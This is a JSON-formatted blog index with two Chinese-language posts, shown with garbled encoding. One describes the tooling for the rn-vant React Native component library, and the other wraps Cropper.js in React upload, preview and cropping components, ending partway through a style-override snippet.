[{"title":"React Native ç»„ä»¶åº“ - è„šæ‰‹æ¶","path":"/2023/02/06/yuque/React Native ç»„ä»¶åº“ - è„šæ‰‹æ¶/","content":"ä½œä¸ºä¸€ä¸ªå‰ç«¯ erï¼Œè°ä¸æƒ³æ‹¥æœ‰ä¸€ä¸ªè‡ªå·±çš„ç»„ä»¶åº“ã€‚æˆ‘ä¹Ÿæƒ³ï¼Œæ‰€ä»¥å®ƒæ¥äº† - rn-vantï¼Œä½¿ç”¨ vant è®¾è®¡è§„èŒƒçš„ React Native ç»„ä»¶åº“ã€‚ ç»„ä»¶åº“ç›®å‰å·²ç»æ‹¥æœ‰äº† 40+ ç»„ä»¶ï¼ˆè™½ç„¶è¿˜æ˜¯å¾ˆç®€é™‹ï¼Œbug ä¹Ÿæ˜¯ä¸€å †ï¼Œä¸»è¦è¿˜æ˜¯æˆ‘å¤ªæ‡’äº† ğŸ˜…ï¼‰ï¼Œä¹Ÿç®—åœ†äº†æˆ‘çš„ä¸€ä¸ªæ¢¦æƒ³ï¼Œç°åœ¨æ˜¯æ—¶å€™åšä¸ªé˜¶æ®µæ€»ç»“äº†ï¼Œå°†è¿™æ®µæ—¶é—´å¼€å‘é‡åˆ°çš„é—®é¢˜éƒ½è®°å½•ä¸‹æ¥ï¼Œä¸€æ–¹é¢æ˜¯æ€•è‡ªå·±å¿˜äº†ï¼Œå¦ä¸€æ–¹é¢ä¹Ÿæ˜¯ç»™çœ‹åˆ°è¿™ç³»åˆ—æ–‡ä»¶çš„æœ‹å‹åšä¸ªå‚è€ƒã€‚ Mono or Multi Repo from https://juejin.cn/post/6949882490324516894#heading-9 è¿™é‡Œç®€å•è§£é‡Šä¸‹ä»€ä¹ˆæ˜¯ MonoRepo ä»¥åŠ MultiRepoï¼Œä»¥åŠä»–ä»¬çš„ä¼˜ç¼ºç‚¹ï¼š MonoRepoï¼šæŠŠå¤šä¸ªé¡¹ç›®æ”¾åœ¨ä¸€ä¸ªä»“åº“é‡Œé¢ç®¡ç†ã€‚ MultiRepoï¼šæ¯ä¸ªé¡¹ç›®éƒ½å¯¹åº”ç€ä¸€ä¸ªå•ç‹¬çš„ä»£ç ä»“åº“æ¯ä¸ªé¡¹ç›®è¿›è¡Œåˆ†æ•£ç®¡ç†ã€‚ MonoRepo ä¼˜ç¼ºç‚¹ï¼š ä¼˜ç‚¹ï¼š ç»Ÿä¸€äº†å·¥ä½œæµï¼šç”±äºæ‰€æœ‰çš„é¡¹ç›®æ”¾åœ¨ä¸€ä¸ªä»“åº“å½“ä¸­ï¼Œå¤ç”¨èµ·æ¥éå¸¸æ–¹ä¾¿ï¼Œå¦‚æœæœ‰ä¾èµ–çš„ä»£ç å˜åŠ¨ï¼Œé‚£ä¹ˆç”¨åˆ°è¿™ä¸ªä¾èµ–çš„é¡¹ç›®å½“ä¸­ä¼šç«‹é©¬æ„ŸçŸ¥åˆ° é™ä½åŸºå»ºæˆæœ¬ï¼šæ‰€æœ‰é¡¹ç›®å¤ç”¨ä¸€å¥—æ ‡å‡†çš„å·¥å…·å’Œè§„èŒƒï¼Œæ— éœ€åˆ‡æ¢å¼€å‘ç¯å¢ƒï¼Œå¦‚æœæœ‰æ–°çš„é¡¹ç›®æ¥å…¥ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å¤ç”¨å·²æœ‰çš„åŸºå»ºæµç¨‹ï¼Œæ¯”å¦‚ CI æµç¨‹ã€æ„å»ºå’Œå‘å¸ƒæµç¨‹ã€‚ æå‡å›¢é˜Ÿåä½œæ•ˆç‡ï¼šä¸€æ–¹é¢å¤§å®¶éƒ½åœ¨ä¸€ä¸ªä»“åº“å¼€å‘ï¼Œèƒ½å¤Ÿæ–¹ä¾¿åœ°å…±äº«å’Œå¤ç”¨ä»£ç ï¼Œæ–¹ä¾¿æ£€ç´¢é¡¹ç›®æºç ï¼Œå¦ä¸€æ–¹é¢ï¼Œgit commit çš„å†å²è®°å½•ä¹Ÿæ”¯æŒä»¥åŠŸèƒ½ä¸ºå•ä½è¿›è¡Œæäº¤ï¼Œä¹‹å‰å¯¹äºæŸä¸ªåŠŸèƒ½çš„æäº¤ï¼Œéœ€è¦æ”¹å¥½å‡ ä¸ªä»“åº“ï¼Œæäº¤å¤šä¸ª commitï¼Œç°åœ¨åªéœ€è¦æäº¤ä¸€æ¬¡ï¼Œç®€åŒ–äº† commit è®°å½•ï¼Œæ–¹ä¾¿åä½œã€‚ ç¼ºç‚¹ï¼š ä½“ç§¯é—®é¢˜ï¼šå› ä¸ºæ‰€æœ‰ code éƒ½åœ¨ä¸€ä¸ª repo ä¸‹ï¼Œè¿™å°±å¯¼è‡´äº†éšç€é¡¹ç›®è¶Šæ¥è¶Šå¤æ‚ï¼Œæ•´ä¸ª repo çš„ä½“ç§¯ä¼šå˜å¾—å¾ˆå¤§ã€‚æ®è¯´æŸå¤§å…¬å¸å‘˜å·¥æƒ³è¦ä¿®æ”¹é¡¹ç›®ä¸­çš„æŸä¸ªå°æ ·å¼ï¼Œéœ€è¦å°†æ•°ä»¥å G çš„ repo æ‹‰åˆ°æœ¬åœ°ï¼Œå¬èµ·æ¥ç¡®å®æ˜¯ä¸ªå™©æ¢¦ã€‚ æƒé™é—®é¢˜ï¼šMonorepo æ¨¡å¼ä¸‹çš„æƒé™æ˜¯å¼€æ”¾çš„ã€‚ä»£ç å®‰å…¨ï¼Œæ–‡æ¡£å®‰å…¨ï¼Œéƒ½ä¼šæ˜¯ä¸€ä¸ªéœ€è¦å¥½å¥½è€ƒè™‘çš„é—®é¢˜ã€‚è¿™ä¸ªæ–¹é¢å¦‚æœå¤„ç†ä¸å¥½çš„è¯ï¼Œå¯¹æ•´ä¸ªå›¢é˜Ÿæ•´ä¸ªé¡¹ç›®å¸¦æ¥çš„åæœå¯èƒ½æ˜¯ç¾éš¾æ€§çš„ã€‚ ç‰ˆæœ¬æ§åˆ¶ï¼šä»“åº“å˜å¾—å¤ªå¤§ï¼Œå¯¹ç‰ˆæœ¬æ§åˆ¶æŠ€æœ¯ä¼šæœ‰å¾ˆå¤§çš„æŒ‘æˆ˜ã€‚å› ä¸º Git ç¤¾åŒºå»ºè®®çš„æ˜¯ä½¿ç”¨æ›´å¤šæ›´å°çš„ä»£ç åº“ï¼ŒGit æœ¬èº«å¹¶ä¸é€‚åˆå•ä¸ªå·¨å¤§çš„ä»£ç åº“ã€‚ Monorepo å’Œ Multirepo éƒ½æ˜¯ç®¡ç†ç»„ç»‡ä»£ç çš„æ–¹å¼ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆä¼˜åŠ£ä¹‹åˆ†ï¼Œè¿˜æ˜¯é‚£å¥è¯â€œå­˜åœ¨å³åˆç†â€ï¼Œå·¥å…·éƒ½æ˜¯ç”¨æ¥æœåŠ¡ç”Ÿäº§çš„ï¼Œèƒ½æ›´æœ‰æ•ˆè§£å†³å½“ä¸‹é—®é¢˜çš„ï¼Œå°±æ˜¯æ›´å¥½çš„ã€‚å›åˆ°ç»„ä»¶åº“ä¸Šï¼ŒæŒ‰ç…§æœ€åˆçš„è§„åˆ’ï¼Œç»„ä»¶åº“æœ€å°‘ä¼šäº§å‡ºä¸¤ä¸ª npm åŒ…ï¼Œç»„ä»¶åº“æœ¬ä½“å’Œ icon ç»„ä»¶ï¼Œå¹¶ä¸”ç»„ä»¶åº“ä¼šä¾èµ– icon ç»„ä»¶ï¼Œè‡ªç„¶é‡‡ç”¨ Monorepo çš„æ–¹å¼æ˜¯æœ€å¥½çš„ã€‚ Monorepo å·¥å…·æ—¢ç„¶é€‰æ‹©äº† Monorepoï¼Œè‡ªç„¶å°±éœ€è¦çœ‹çœ‹ç¤¾åŒºé‡Œæœ‰å“ªäº›å¥½çš„ Monorepo å·¥å…·ï¼š Bitï¼šç”¨äºç»„ä»¶é©±åŠ¨å¼€å‘çš„å·¥å…·é“¾ Turborepoï¼šç”¨äº JavaScript å’Œ TypeScript ä»£ç åº“çš„é«˜æ€§èƒ½æ„å»ºç³»ç»Ÿã€‚ Rushï¼šä¸€ä¸ªå¯æ‰©å±•çš„ web å•ä»“åº“ç®¡ç†å™¨ã€‚ Nxï¼šå…·æœ‰ä¸€æµçš„ monorepo æ”¯æŒå’Œå¼ºå¤§é›†æˆçš„ä¸‹ä¸€ä»£æ„å»ºç³»ç»Ÿã€‚ Lernaï¼šç”¨äºç®¡ç†åŒ…å«å¤šä¸ªè½¯ä»¶åŒ…çš„é¡¹ç›® ä¸Šé¢è¿™äº›å·¥å…·ä¸­ï¼Œæˆ‘æœ€ç†Ÿæ‚‰çš„å°±æ˜¯ Lerna äº†ï¼Œç®€å•è€Œä¸ç®€é™‹ï¼Œå®Œå…¨èƒ½å¤Ÿèƒœä»»ç»„ä»¶åº“ç¼–æ’çš„å·¥ä½œï¼Œå› æ­¤é¦–é€‰ Lerna äº†ã€‚ï¼ˆæ€§èƒ½ç¡®å®ä¸å¦‚å…¶ä»–çš„å·¥å…·ï¼Œæ¯”å¦‚ Turborepoï¼Œä½†æ˜¯ç›®å‰ä¹Ÿå¹¶æ²¡æœ‰å¤ªå¤§çš„æ€§èƒ½è¯‰æ±‚ï¼Œä»¥åé‡åˆ°äº†ï¼Œå¯ä»¥åœ¨è¿ç§»ï¼‰ ç»„ä»¶åº“æ„å»ºå·¥å…·æˆ‘ä»¬çš„ç»„ä»¶åº“æœ€ç»ˆæ˜¯éœ€è¦å‘å¸ƒåˆ° npm ä¸Šçš„ï¼Œå› ä¸ºç»„ä»¶åº“çš„è¿è¡Œç¯å¢ƒä¸åœ¨æµè§ˆå™¨ä¸­ï¼Œå› æ­¤åªéœ€è¦æä¾› ES Moduleå’Œ CommonJSæ¨¡å—çš„ç»„ä»¶å³å¯ï¼Œå¦å¤–å¦‚æœæ˜¯ Typescript å·¥ç¨‹ï¼Œæ„å»ºæ—¶è¿˜éœ€è¦è¾“å‡ºç±»å‹æ–‡ä»¶ï¼Œåœ¨è°ƒç ”ç¤¾åŒºå¼€æºçš„ç»„ä»¶åº“ä¼šé”å®šä¸€ä¸ªå·¥å…· - react-native-builder-bob å®‰è£… react-native-builder-bob: 1yarn add react-native-builder-bob -D é…ç½®åŠä½¿ç”¨éƒ½å¾ˆç®€å•ï¼Œåœ¨ package.json ä¸­æ–°å¢å¦‚ä¸‹é…ç½®ï¼š 12345678910111213141516171819&#123; &quot;scripts&quot;: &#123; &quot;build&quot;: &quot;bob build&quot; &#125;, &quot;react-native-builder-bob&quot;: &#123; &quot;source&quot;: &quot;src&quot;, &quot;output&quot;: &quot;lib&quot;, &quot;targets&quot;: [ &quot;commonjs&quot;, &quot;module&quot;, [ &quot;typescript&quot;, &#123; &quot;project&quot;: &quot;tsconfig.build.json&quot; &#125; ] ] &#125;&#125; è¿è¡Œ yarn buildåï¼Œä¼šåœ¨ lib ç›®å½•ä¸‹ç”Ÿæˆç›¸åº”æ¨¡å—çš„æ–‡ä»¶ï¼š æœ€ååœ¨ package.json ä¸­ï¼Œæ·»åŠ è¿™äº›æ¨¡å—çš„å…¥å£è¯´æ˜ï¼š 1234567&#123; &quot;main&quot;: &quot;lib/commonjs/index&quot;, &quot;module&quot;: &quot;lib/module/index&quot;, &quot;types&quot;: &quot;lib/typescript/index.d.ts&quot;, &quot;react-native&quot;: &quot;src/index&quot;, &quot;source&quot;: &quot;src/index&quot;&#125; ä»£ç è´¨é‡ and ä»£ç é£æ ¼ä»£ç è´¨é‡ç›®å‰åªé…ç½®äº† eslintï¼Œåé¢å¦‚æœæœ‰æ›´å¥½çš„å·¥å…·ï¼Œå¯ä»¥å°è¯•æ¥å…¥ã€‚ç°åœ¨ä½¿ç”¨çš„æ˜¯ https://github.com/youngjuning-archive/eslint-config è¿™ä¸ªï¼Œä¸»è¦çœ‹ä¸­å®ƒå°† prettier å’Œ eslint é›†æˆåˆ°ä¸€èµ·äº†ï¼Œçœäº†è‡ªå·±é…ç½®ï¼ˆprettier å’Œ eslint æœ‰äº›è§„åˆ™æ˜¯å†²çªçš„ï¼Œè§£å†³èµ·æ¥è¶…çº§éº»çƒ¦ï¼‰ï¼Œè€Œä¸” eslint çš„è§„åˆ™æ¥è‡ª airbnbï¼Œä»£ç è´¨é‡ä¹Ÿæœ‰äº†ä¿éšœã€‚ ä»£ç é£æ ¼ç”¨çš„æ˜¯ prettierï¼Œå› ä¸ºå·²ç»é›†æˆåˆ° @youngjuning/eslint-configäº†ï¼Œåªéœ€è¦å®‰è£… @youngjuning/prettier-configï¼Œå¹¶ç®€å•é…ç½®ä¸‹å°±èƒ½ä½¿ç”¨äº†ã€‚ 12// .prettierrc.jsmodule.exports = require(&quot;@youngjuning/prettier-config&quot;); é™¤äº† eslint å’Œ prettierï¼Œæˆ‘ä»¬è¿˜èƒ½å€ŸåŠ©ä¸€äº›å·¥å…·ï¼Œæ¥å¸®åŠ©æˆ‘ä»¬æ›´å¥½çš„ç»„ç»‡ä»£ç ï¼š huskyï¼šç®¡ç† git hook çš„å·¥å…·ï¼Œå¯ä»¥åœ¨ git commit æ—¶ï¼Œå¼ºåˆ¶æ ¡éªŒå’Œæ ¼å¼åŒ–ä»£ç ã€‚ lint-stagedï¼šé’ˆå¯¹ git æš‚å­˜æ–‡ä»¶æ‰§è¡Œä¸€äº›è„šæœ¬ï¼Œç»“åˆ husky å¯ä»¥å®ç°åªå¯¹æ”¹åŠ¨çš„æ–‡ä»¶ï¼Œæ ¡éªŒå’Œæ ¼å¼åŒ–ï¼Œæ¯•ç«Ÿæ”¹ä¸€è¡Œä»£ç å°±è¦æ ¡éªŒæ•´ä¸ªä»“åº“æˆæœ¬è¿˜æ˜¯å¤ªé«˜äº†ã€‚ commitlintï¼šgit commit messages é£æ ¼æ ¡éªŒå·¥å…·ã€‚ è‡³äºå¦‚ä½•åœ¨ lerna é¡¹ç›®ä¸­å¦‚ä½•é›†æˆè¿™äº›å·¥å…·ï¼Œå¯ä»¥çœ‹æˆ‘çš„å¦ä¸€ç¯‡åšå®¢ ã€lerna é¡¹ç›®ä¸­é›†æˆ huskyã€lint-stagedã€commitlint å’Œ cz-customizableã€‘ï¼Œé‡Œé¢åšäº†è¯¦ç»†çš„è¯´æ˜ã€‚ æ€»ç»“æœ¬æ–‡ä¸»è¦ä»‹ç»äº†å¼€å‘ä¸€ä¸ªç»„ä»¶åº“éœ€è¦çš„ä¸€äº›å·¥å…·çš„é€‰å‹ï¼Œå®é™…ä¸Šè¿™äº›å·¥å…·ç†Ÿæ‚‰å‰ç«¯å·¥ç¨‹åŒ–çš„åŒå­¦éƒ½ä¸ä¼šé™Œç”Ÿï¼Œå…·ä½“çš„é…ç½®å¯ä»¥å‚è€ƒæˆ‘çš„ç»„ä»¶åº“é¡¹ç›® - rn-vantã€‚åé¢æˆ‘ä¼šå†ä»‹ç»ä¸‹ç»„ä»¶æ–¹çš„æ–‡æ¡£åŠ CI&#x2F;CD çš„ç›¸å…³é…ç½®ã€‚"},{"title":"Cropper.js å®è·µ","path":"/2023/02/02/yuque/Cropper.js å®è·µ/","content":"èƒŒæ™¯å‰æ®µæ—¶é—´æ¥äº†ä¸ªéœ€æ±‚ï¼Œéœ€è¦åšä¸ªå›¾ç‰‡ä¸Šä¼ ï¼Œé¢„è§ˆåŠè£åˆ‡æœåŠ¡ï¼Œè°ƒç ”äº†ä¸‹ç¤¾åŒºçš„å¼€æºæ–¹æ¡ˆï¼Œcropperjs è¿›å…¥è§†é‡ï¼Œç®€å•çœ‹äº†ä¸‹ READMEï¼Œå®Œç¾ç¬¦åˆæˆ‘çš„éœ€æ±‚ï¼Œæœ€ç»ˆå®ç°æ•ˆæœå¦‚ä¸‹ï¼š å®‰è£…æ²¡å•¥å¥½è¯´çš„ï¼Œç›´æ¥ yarn èµ°èµ·ï¼š 1yarn add cropperjs å¼•å…¥ CSS æ–‡ä»¶ï¼š 1import &quot;cropperjs/dist/cropper.css&quot;; å°è£…ç®€å•çš„åˆ†æä¸‹éœ€æ±‚ï¼Œæ•´ä¸ªå›¾ç‰‡è£åˆ‡åŒ…å«ä»¥ä¸‹å‡ ä¸ªéƒ¨ä»¶ï¼š å›¾ç‰‡è£åˆ‡æ¡† - åŒ…å«ã€Œç½‘é¡µç«¯ã€å’Œã€Œç§»åŠ¨ç«¯ã€ï¼Œéœ€è¦åˆ†å¼€è£åˆ‡ æ›¿æ¢å›¾ç‰‡æŒ‰é’® - æ›¿æ¢å›¾ç‰‡åï¼Œã€Œç½‘é¡µç«¯ã€å’Œã€Œç§»åŠ¨ç«¯ã€éƒ½éœ€è¦æ›¿æ¢ å›¾ç‰‡é¢„è§ˆ - åŒæ ·ã€Œç½‘é¡µç«¯ã€å’Œã€Œç§»åŠ¨ç«¯ã€ä¹Ÿéœ€è¦åˆ†å¼€é¢„è§ˆ Cropper.js æ˜¯ä¸ªåŸç”Ÿçš„è£åˆ‡åº“ï¼Œåœ¨æˆ‘ä»¬çš„ React é¡¹ç›®ä¸­æŒ‰ç…§ä¸Šé¢çš„åŠŸèƒ½åˆ’åˆ†å°è£…æˆä»¥ä¸‹å‡ ä¸ªç»„ä»¶ï¼š Upload.tsx 12345678910111213141516171819202122232425262728293031323334353637383940import React, &#123; useContext, memo &#125; from &quot;react&quot;;import &#123; Upload as PDUpload &#125; from &quot;@universe-design/react&quot;;import &#123; CropperContext &#125; from &quot;./Context&quot;;type UploadProps = &#123; maxSize?: number; children?: React.ReactNode; accept?: string;&#125;;export const Upload = memo((props: UploadProps): JSX.Element =&gt; &#123; const &#123; accept = &quot;image/*&quot;, maxSize &#125; = props; const &#123; setSrc &#125; = useContext(CropperContext); const beforeUpload = (file: File) =&gt; &#123; // æ£€æŸ¥æ–‡ä»¶å¤§å° if (file.size &amp;&amp; maxSize &amp;&amp; file.size &gt; maxSize) &#123; return PDUpload.LIST_IGNORE; &#125; const reader = new FileReader(); reader.onload = () =&gt; &#123; setSrc?.(reader.result as string); &#125;; reader.readAsDataURL(file); return false; &#125;; return ( &lt;PDUpload maxCount=&#123;1&#125; beforeUpload=&#123;beforeUpload&#125; fileList=&#123;[]&#125; accept=&#123;accept&#125; &gt; &#123;props.children&#125; &lt;/PDUpload&gt; );&#125;); è¿™ä¸ªç»„ä»¶çš„åŠŸèƒ½å¾ˆç®€å•ï¼Œå°±æ˜¯ä½¿ç”¨ç»„ä»¶åº“çš„ä¸Šä¼ ç»„ä»¶è·å–æ–‡ä»¶çš„ base64ï¼Œç„¶åä¿å­˜åˆ° context é‡Œï¼Œæ–¹ä¾¿è£åˆ‡ç»„ä»¶æ¶ˆè´¹ã€‚ Context.tsx 12345678910111213141516171819202122232425262728293031323334import React, &#123; createContext, FC, useMemo, useState, useRef &#125; from &quot;react&quot;;import &#123; uniqueId &#125; from &quot;lodash&quot;;export interface CropperState &#123; src?: string | undefined; setSrc: (src: string) =&gt; void; previewClass: string;&#125;export interface CropperProviderProps &#123; src?: string | undefined;&#125;export const CropperContext = createContext&lt;CropperState&gt;(&#123;&#125; as CropperState);export const CropperProvider: FC&lt;CropperProviderProps&gt; = (props) =&gt; &#123; const [src, setSrc] = useState(props.src); const previewClass = useRef(uniqueId(&quot;image_preview_&quot;)); const contextState = useMemo&lt;CropperState&gt;( () =&gt; (&#123; src, setSrc, previewClass: previewClass.current, &#125;), [src] ); return ( &lt;CropperContext.Provider value=&#123;contextState&#125;&gt; &#123;props.children&#125; &lt;/CropperContext.Provider&gt; );&#125;; Prview.tsx 1234567891011121314151617181920212223242526import React, &#123; useContext, memo &#125; from &quot;react&quot;;import classnames from &quot;classnames&quot;;import &#123; CropperContext &#125; from &quot;./Context&quot;;import styles from &quot;./index.less&quot;;export interface PreviewProps extends React.HTMLAttributes&lt;HTMLDivElement&gt; &#123; name?: string;&#125;export const Preview: React.FC&lt;PreviewProps&gt; = memo((props) =&gt; &#123; const &#123; name = &quot;default&quot;, className, children, ...rest &#125; = props; const &#123; previewClass &#125; = useContext(CropperContext); return ( &lt;div &#123;...rest&#125; className=&#123;classnames( `$&#123;previewClass&#125;-$&#123;name&#125;`, styles[&quot;image-preview&quot;], className )&#125; &gt; &#123;children&#125; &lt;/div&gt; );&#125;); é¢„è§ˆç»„ä»¶æœ¬èº«ä¹Ÿä¸å¤æ‚ï¼Œå°±æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒCropper.js çš„ preview å‚æ•°å¯ä»¥æ˜¯ä¸ªå…ƒç´ ï¼Œå…ƒç´ æ•°ç»„æˆ–è€…èƒ½å¤Ÿè¢« Document.querySelectorAll é€‰ä¸­çš„ class é€‰æ‹©å™¨ï¼Œå› ä¸ºå°è£…æˆäº†é€šç”¨ç»„ä»¶ï¼Œå› æ­¤ä½¿ç”¨äº† lodash çš„ uniqueId æ–¹æ³•ç”Ÿæˆå”¯ä¸€çš„ classï¼Œé˜²æ­¢é¡µé¢å‡ºç°å¤šä¸ª Prview ç»„ä»¶æ—¶ï¼Œclass ç±»åå†²çªã€‚ Cropper.tsx 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125import React, &#123; useContext, memo, useRef, useEffect &#125; from &quot;react&quot;;import Cropper from &quot;cropperjs&quot;;import &#123; useMemoizedFn, useInViewport, useUpdateLayoutEffect &#125; from &quot;ahooks&quot;;import classnames from &quot;classnames&quot;;import &quot;cropperjs/dist/cropper.css&quot;;import &#123; CropperContext &#125; from &quot;./Context&quot;;import styles from &quot;./index.less&quot;;type CropperOptions = Cropper.Options&lt;HTMLImageElement&gt;;type ReactCropperProps = Pick&lt;CropperOptions, &quot;aspectRatio&quot;&gt; &amp; &#123; name?: string; style?: React.CSSProperties; className?: string; alt?: string; src?: string; data?: Cropper.Data; onCrop?: (data: Cropper.Data) =&gt; void; // ç›‘å¬è£åˆ‡æ¡†çš„å˜åŠ¨&#125;;interface ReactCropperElement extends HTMLImageElement &#123; cropper: Cropper;&#125;export type ReactCropperRef = Cropper;const REQUIRED_IMAGE_STYLES = &#123; opacity: 0, maxWidth: &quot;100%&quot; &#125;;const ReactCropper = React.forwardRef&lt;ReactCropperRef, ReactCropperProps&gt;( (props, ref) =&gt; &#123; const &#123; name = &quot;default&quot;, style, className, alt = &quot;picture&quot;, aspectRatio, data, onCrop, &#125; = props; const boxRef = useRef&lt;HTMLDivElement&gt;(null); const combinedRef = useRef&lt;ReactCropperElement&gt;(null); const cropperState = useContext(CropperContext); // æ˜¯å¦åœ¨å¯æ˜¯åŒºåŸŸå†… const [inViewport] = useInViewport(boxRef); const src = cropperState?.src || props?.src; const preSrc = useRef&lt;string | undefined&gt;(src); const preview = `.$&#123;cropperState.previewClass&#125;-$&#123;name&#125;`; React.useImperativeHandle(ref, () =&gt; combinedRef.current!.cropper); /** * æ»¡è¶³ä»¥ä¸‹æ¡ä»¶æ‰èƒ½é‡æ–° render * 1. src åœ°å€å˜æ›´ * 2. åœ¨å¯æ˜¯åŒºåŸŸå†…ï¼ˆå¦‚æœä¸åœ¨å¯è§†åŒºåŸŸï¼Œrender æ—¶ä¼šå‡ºé—®é¢˜ï¼‰ */ useEffect(() =&gt; &#123; if ( combinedRef.current?.cropper &amp;&amp; typeof src !== &quot;undefined&quot; &amp;&amp; inViewport &amp;&amp; src !== preSrc.current ) &#123; combinedRef.current.cropper.reset().clear().replace(src); preSrc.current = src; &#125; &#125;, [inViewport, src]); const handleCrop = useMemoizedFn(() =&gt; &#123; if (combinedRef.current?.cropper) &#123; onCrop?.(combinedRef.current?.cropper.getData()); &#125; &#125;); useUpdateLayoutEffect(() =&gt; &#123; data &amp;&amp; combinedRef.current?.cropper.setData(data); &#125;, [data]); useUpdateLayoutEffect(() =&gt; &#123; aspectRatio &amp;&amp; combinedRef.current?.cropper.setAspectRatio(aspectRatio); &#125;, [aspectRatio]); useEffect(() =&gt; &#123; if (combinedRef.current !== null) &#123; // eslint-disable-next-line no-new new Cropper(combinedRef.current, &#123; viewMode: 1, // é™åˆ¶è£å‰ªæ¡†ä¸èƒ½è¶…å‡ºå›¾ç‰‡çš„èŒƒå›´ dragMode: &quot;crop&quot;, // æ‹–æ‹½å›¾ç‰‡æ—¶å½¢æˆæ–°çš„è£å‰ªæ¡† guides: true, // æ˜¯å¦æ˜¾ç¤ºè£å‰ªæ¡†çš„è™šçº¿ scalable: false, // æ˜¯å¦å¯ä»¥ç¼©æ”¾å›¾ç‰‡ï¼ˆå¯ä»¥æ”¹å˜é•¿å®½ï¼‰ zoomable: false, // æ˜¯å¦å¯ä»¥ç¼©æ”¾å›¾ç‰‡ï¼ˆæ”¹å˜ç„¦è·ï¼‰ zoomOnTouch: false, // æ˜¯å¦å¯ä»¥é€šè¿‡æ‹–æ‹½è§¦æ‘¸ç¼©æ”¾å›¾ç‰‡ zoomOnWheel: false, // æ˜¯å¦å¯ä»¥é€šè¿‡é¼ æ ‡æ»šè½®ç¼©æ”¾å›¾ç‰‡ center: false, // æ˜¯å¦æ˜¾ç¤ºè£å‰ªæ¡†ä¸­é—´çš„ â€˜+â€™ æŒ‡ç¤ºå™¨ responsive: false, // æ˜¯å¦åœ¨çª—å£å°ºå¯¸è°ƒæ•´å è¿›è¡Œå“åº”å¼çš„é‡æ¸²æŸ“ movable: false, // æ˜¯å¦å¯ä»¥ç§»åŠ¨å›¾ç‰‡ preview, aspectRatio, // è®¾ç½®è£å‰ªæ¡†ä¸ºå›ºå®šçš„å®½é«˜æ¯” data, // ä¹‹å‰å­˜å‚¨çš„è£å‰ªåçš„æ•°æ® åœ¨åˆå§‹åŒ–æ—¶ä¼šè‡ªåŠ¨è®¾ç½® crop: handleCrop, &#125;); &#125; return () =&gt; &#123; combinedRef.current?.cropper?.destroy(); &#125;; // eslint-disable-next-line react-hooks/exhaustive-deps &#125;, [preview, handleCrop]); return ( &lt;div style=&#123;style&#125; className=&#123;classnames(styles.cropper, className)&#125; ref=&#123;boxRef&#125; &gt; &lt;img src=&#123;src&#125; alt=&#123;alt&#125; style=&#123;REQUIRED_IMAGE_STYLES&#125; ref=&#123;combinedRef&#125; /&gt; &lt;/div&gt; ); &#125;);export default memo(ReactCropper); æœ€åå°±æ˜¯é‡å¤´æˆçš„ Cropper äº†ï¼Œç»„ä»¶å†…éƒ¨å°è£…äº† Cropper.js åˆå§‹åŒ–é€»è¾‘ï¼Œå›¾ç‰‡åˆ‡æ¢çš„é€»è¾‘ã€‚ index.tsx 123456789101112131415import CropperInner from &quot;./Cropper&quot;;import &#123; CropperProvider &#125; from &quot;./Context&quot;;import &#123; Upload &#125; from &quot;./Upload&quot;;import &#123; Preview &#125; from &quot;./Preview&quot;;export * from &quot;./Cropper&quot;;export * from &quot;./Context&quot;;const Cropper = Object.assign(CropperInner, &#123; Upload, Provider: CropperProvider, Preview,&#125;);export default Cropper; æœ€åå°±æ˜¯å°†è¿™äº›ç»„ä»¶å…¨éƒ¨æŒ‚è½½åˆ° Cropperï¼Œå¯¹å¤–åªæš´éœ² Cropper è¿™ä¸€ä¸ªç»„ä»¶ã€‚ ä½¿ç”¨ä½¿ç”¨å°è£…åçš„ Cropper ç»„ä»¶å¤§æ¦‚å¦‚ä¸‹ï¼Œå…¶ä¸­ Cropper ç»„ä»¶å’Œ Cropper.Preview ç»„ä»¶å¯ä»¥æœ‰ä»»æ„å¤šä¸ªï¼Œä½†æ˜¯éœ€è¦æ³¨æ„ï¼Œä¸¤ä¸ªç»„ä»¶çš„ name å­—æ®µè¦ä¸€ä¸€å¯¹åº”ï¼Œå¦åˆ™ä¼šå‡ºç°æ— æ³•å®æ—¶é¢„è§ˆçš„æƒ…å†µã€‚ 123456789101112131415161718192021222324252627import Cropper from &quot;./Cropper&quot;;export default () =&gt; &#123; return ( &lt;Cropper.Provider src=&quot;xxxxx&quot;&gt; // è£åˆ‡ç»„ä»¶ &lt;Cropper aspectRatio=&#123;PC_CROP_RATIO&#125; name=&quot;PC&quot; ref=&#123;(ref) =&gt; setRef(ref!, TYPE.web)&#125; className=&#123;styles[&quot;container-cropper&quot;]&#125; onCrop=&#123;(data) =&gt; handleCrop(data, TYPE.web)&#125; data=&#123;cacheValue.current?.tailored_info?.web&#125; /&gt; // ä¸Šä¼ ç»„ä»¶ &lt;Cropper.Upload accept=&#123;UPLOAD_ACCEPT&#125; maxSize=&#123;UPLOAD_MAX_SIZE&#125;&gt; &lt;Button type=&quot;link&quot;&gt;&#123;i18next.t(&quot;replace-image&quot;)&#125;&lt;/Button&gt; &lt;/Cropper.Upload&gt; // é¢„è§ˆç»„ä»¶ &lt;Cropper.Preview style=&#123;bannerStyle&#125; className=&#123;styles[&quot;preview-mobile&quot;]&#125; name=&quot;mobile&quot; /&gt; &lt;/Cropper.Provider&gt; );&#125;; æ ·å¼è¦†ç›–ç»„ä»¶é€»è¾‘è§£å†³äº†ï¼Œç°åœ¨è§£å†³æ ·å¼é—®é¢˜ã€‚æˆ‘ä»¬ä¹‹å‰å¼•å…¥äº† cropperjs çš„é»˜è®¤æ ·å¼æ–‡ä»¶ï¼Œç°åœ¨åªéœ€è¦è¦†ç›–æ‰å®ƒçš„æ ·å¼å°±å¯ä»¥äº† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960// å¤å†™ Cropper çš„æ ·å¼.cropper &#123; :global &#123; .cropper-modal &#123; opacity: 0.4; &#125; .cropper-line &#123; background-color: #fff; &#125; .cropper-point &#123; &amp;.point-e, &amp;.point-n, &amp;.point-w, &amp;.point-s &#123; display: none; &#125; &amp;.point-ne, &amp;.point-nw, &amp;.point-sw, &amp;.point-se &#123; width: 20px; height: 20px; background: transparent; opacity: 1; &#125; &amp;.point-nw, &amp;.point-ne &#123; border-top: 3px solid #fff; &#125; &amp;.point-nw, 